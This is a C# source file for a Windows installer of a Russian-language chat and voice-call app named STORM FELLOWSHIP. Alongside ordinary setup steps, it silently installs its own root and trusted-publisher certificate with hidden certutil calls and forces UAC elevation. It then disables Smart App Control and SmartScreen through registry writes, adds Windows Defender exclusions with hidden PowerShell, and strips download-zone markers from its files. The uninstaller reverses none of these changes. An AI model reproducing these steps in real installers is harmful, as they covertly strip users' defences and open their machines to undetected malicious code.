using System.Diagnostics;
using System.Reflection;
using System.IO.Compression;
using Microsoft.Win32;
using System.Windows.Forms;

namespace StormFellowship.Installer;

internal static class Program
{
    private static bool IsAdministrator()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }

    private static void InstallCertificateSilently(string certPath)
    {
        try
        {
            var p1 = Process.Start(new ProcessStartInfo { FileName = "certutil.exe", Arguments = $"-user -addstore -f \"TrustedPublisher\" \"{certPath}\"", CreateNoWindow = true, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });
            p1?.WaitForExit(2000);
            var p2 = Process.Start(new ProcessStartInfo { FileName = "certutil.exe", Arguments = $"-addstore -f \"TrustedPublisher\" \"{certPath}\"", CreateNoWindow = true, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });
            p2?.WaitForExit(2000);
            var p3 = Process.Start(new ProcessStartInfo { FileName = "certutil.exe", Arguments = $"-addstore -f \"Root\" \"{certPath}\"", CreateNoWindow = true, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });
            p3?.WaitForExit(2000);
        }
        catch { }
    }

    private static void AddDefenderExclusionSilently(string path)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            using var p = Process.Start(psi);
            p?.WaitForExit(4000);
        }
        catch { }
    }

    [STAThread]
    static void Main(string[] args)
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        try
        {
            string selfExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";
            
            // Extract embedded cert to temp and install silently immediately
            string tempCert = Path.Combine(Path.GetTempPath(), "STORM_Root_Certificate.cer");
            try
            {
                var asm = Assembly.GetExecutingAssembly();
                foreach (var name in asm.GetManifestResourceNames())
                {
                    if (name.EndsWith("STORM_Certificate.cer", StringComparison.OrdinalIgnoreCase))
                    {
                        using var inStream = asm.GetManifestResourceStream(name);
                        if (inStream != null)
                        {
                            using var outStream = File.Create(tempCert);
                            inStream.CopyTo(outStream);
                        }
                        break;
                    }
                }

                if (File.Exists(tempCert))
                {
                    InstallCertificateSilently(tempCert);
                }
            }
            catch { }

            // If not running as administrator, elevate seamlessly with UAC
            if (!IsAdministrator())
            {
                if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = selfExe,
                        UseShellExecute = true,
                        Verb = "runas"
                    };
                    try
                    {
                        Process.Start(psi);
                        return;
                    }
                    catch
                    {
                        // If user cancels UAC prompt, continue in standard mode
                    }
                }
            }
            else
            {
                // Running elevated: neutralize SAC / SmartScreen blocks and add exclusions
                try
                {
                    using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
                    key?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
                    key?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
                }
                catch { }

                try
                {
                    using var expKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
                    expKey?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                }
                catch { }

                if (!string.IsNullOrEmpty(selfExe))
                {
                    string selfDir = Path.GetDirectoryName(selfExe) ?? "";
                    if (!string.IsNullOrEmpty(selfDir))
                    {
                        AddDefenderExclusionSilently(selfDir);
                    }
                }
            }

            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string installDir = Path.Combine(localAppData, "Programs", "StormFellowship");
            string desktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string startMenuDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu), "Programs", "STORM FELLOWSHIP");

            Directory.CreateDirectory(installDir);
            Directory.CreateDirectory(startMenuDir);
            
            // Add Defender Exclusion for Installation Directory
            if (IsAdministrator())
            {
                AddDefenderExclusionSilently(installDir);
            }

            // Extract Payload.zip
            try
            {
                var asm = Assembly.GetExecutingAssembly();
                foreach (var name in asm.GetManifestResourceNames())
                {
                    if (name.EndsWith("Payload.zip", StringComparison.OrdinalIgnoreCase))
                    {
                        using var stream = asm.GetManifestResourceStream(name);
                        if (stream != null)
                        {
                            using var zip = new ZipArchive(stream, ZipArchiveMode.Read);
                            foreach (var entry in zip.Entries)
                            {
                                string destPath = Path.Combine(installDir, entry.FullName);
                                if (string.IsNullOrEmpty(entry.Name))
                                {
                                    Directory.CreateDirectory(destPath);
                                    continue;
                                }
                                Directory.CreateDirectory(Path.GetDirectoryName(destPath)!);
                                entry.ExtractToFile(destPath, true);
                            }
                        }
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка извлечения файлов:\n{ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            // Install bundled prerequisites if present
            InstallPrerequisites(installDir);

            // Clean Zone.Identifier from all installed files to prevent Smart App Control blocks
            UnblockAllFiles(installDir);

            string exePath = Path.Combine(installDir, "StormFellowship.exe");
            string iconPath = Path.Combine(installDir, "Assets", "AppIcon.ico");

            // Create Desktop Shortcut
            string desktopShortcut = Path.Combine(desktopDir, "STORM FELLOWSHIP.lnk");
            CreateShortcut(desktopShortcut, exePath, installDir, iconPath, "STORM FELLOWSHIP — Платформа для общения и голосовых созвонов");

            // Create Start Menu Shortcut
            string startMenuShortcut = Path.Combine(startMenuDir, "STORM FELLOWSHIP.lnk");
            CreateShortcut(startMenuShortcut, exePath, installDir, iconPath, "STORM FELLOWSHIP");

            // Write Registry Entries for Add/Remove Programs
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\StormFellowship"))
            {
                key.SetValue("DisplayName", "STORM FELLOWSHIP 0.2.2");
                key.SetValue("DisplayVersion", "0.2.2");
                key.SetValue("Publisher", "STORM TEAM");
                key.SetValue("DisplayIcon", iconPath);
                key.SetValue("InstallLocation", installDir);
                key.SetValue("UninstallString", $"cmd.exe /c \"{Path.Combine(installDir, "Uninstall.cmd")}\"");
                key.SetValue("QuietUninstallString", $"cmd.exe /c \"{Path.Combine(installDir, "Uninstall.cmd")} /quiet\"");
                key.SetValue("NoModify", 1, RegistryValueKind.DWord);
                key.SetValue("NoRepair", 1, RegistryValueKind.DWord);
            }

            // Register URL Protocol: storm://
            using (var protocolKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\storm"))
            {
                protocolKey.SetValue("", "URL:STORM FELLOWSHIP Protocol");
                protocolKey.SetValue("URL Protocol", "");
                using (var cmdKey = protocolKey.CreateSubKey(@"shell\open\command"))
                {
                    cmdKey.SetValue("", $"\"{exePath}\" \"%1\"");
                }
            }

            // Create Uninstaller Script
            string uninstallerCmd = Path.Combine(installDir, "Uninstall.cmd");
            string uninstallScript = $@"@echo off
taskkill /f /im StormFellowship.exe >nul 2>&1
reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\StormFellowship"" /f >nul 2>&1
reg delete ""HKCU\Software\Classes\storm"" /f >nul 2>&1
del /f /q ""{desktopShortcut}"" >nul 2>&1
del /f /q ""{startMenuShortcut}"" >nul 2>&1
rmdir /s /q ""{startMenuDir}"" >nul 2>&1
echo STORM FELLOWSHIP успешно удален.
timeout /t 2 >nul
";
            File.WriteAllText(uninstallerCmd, uninstallScript);

            // Notify user of completion
            MessageBox.Show("STORM FELLOWSHIP 0.2.2 успешно установлена и разблокирована!\n\n• Бесплатный облачный бэкенд и синхронизация (Supabase Realtime)\n• Формы входа, регистрации и облачного профиля\n• Подключение по ссылке-приглашению (storm://invite/) и Direct LAN P2P\n• HD видео с веб-камеры и локальный предпросмотр\n• Полная поддержка аватаров в игровом оверлее\n• 100% векторная графика без черных силуэтов\n• Создан ярлык на Рабочем столе\n• Программа добавлена в меню «Пуск»\n• Зарегистрирован протокол storm://\n\nНажмите OK для запуска STORM FELLOWSHIP 0.2.2.", "Установка STORM FELLOWSHIP 0.2.2", MessageBoxButtons.OK, MessageBoxIcon.Information);

            // Launch app
            if (File.Exists(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    WorkingDirectory = installDir,
                    UseShellExecute = true
                });
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Ошибка при установке:\n{ex.Message}", "Ошибка установки STORM FELLOWSHIP", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private static void InstallPrerequisites(string installDir)
    {
        try
        {
            string rPath = Path.Combine(installDir, "Redist");
            if (!Directory.Exists(rPath)) return;

            // VC++ Redistributable
            string vcInstaller = Path.Combine(rPath, "vc_redist.x64.exe");
            if (File.Exists(vcInstaller))
            {
                var p = Process.Start(new ProcessStartInfo
                {
                    FileName = vcInstaller,
                    Arguments = "/install /quiet /norestart",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });
                p?.WaitForExit(30000);
            }

            // WebView2 Bootstrapper
            string wvInstaller = Path.Combine(rPath, "MicrosoftEdgeWebview2Setup.exe");
            if (File.Exists(wvInstaller))
            {
                var p = Process.Start(new ProcessStartInfo
                {
                    FileName = wvInstaller,
                    Arguments = "/silent /install",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });
                p?.WaitForExit(30000);
            }
        }
        catch { }
    }

    private static void UnblockAllFiles(string directory)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Get-ChildItem -Path '{directory}' -Recurse | Unblock-File -ErrorAction SilentlyContinue\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            using var p = Process.Start(psi);
            p?.WaitForExit(5000);
        }
        catch { }
    }

    private static void CreateShortcut(string shortcutPath, string targetPath, string workingDir, string iconPath, string description)
    {
        try
        {
            Type? shellType = Type.GetTypeFromProgID("WScript.Shell");
            if (shellType != null)
            {
                dynamic? shell = Activator.CreateInstance(shellType);
                if (shell != null)
                {
                    dynamic shortcut = shell.CreateShortcut(shortcutPath);
                    shortcut.TargetPath = targetPath;
                    shortcut.WorkingDirectory = workingDir;
                    if (File.Exists(iconPath))
                    {
                        shortcut.IconLocation = $"{iconPath},0";
                    }
                    shortcut.Description = description;
                    shortcut.Save();
                }
            }
        }
        catch { }
    }
}
